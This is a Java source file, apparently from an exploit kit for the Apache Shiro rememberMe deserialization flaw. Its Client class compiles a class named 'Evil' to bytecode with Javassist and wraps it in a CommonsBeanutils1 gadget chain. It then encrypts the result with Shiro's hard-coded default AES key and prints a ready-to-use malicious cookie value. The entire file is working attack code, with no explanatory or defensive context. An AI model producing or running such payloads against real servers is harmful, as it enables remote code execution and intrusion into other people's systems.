package org.example;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.IOException;
import java.util.Base64;

public class Client {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(org.example.Evil.class.getName());
        byte[] payload = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] decode = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource encrypt = aes.encrypt(payload, decode);
        System.out.println(encrypt);
    }

}
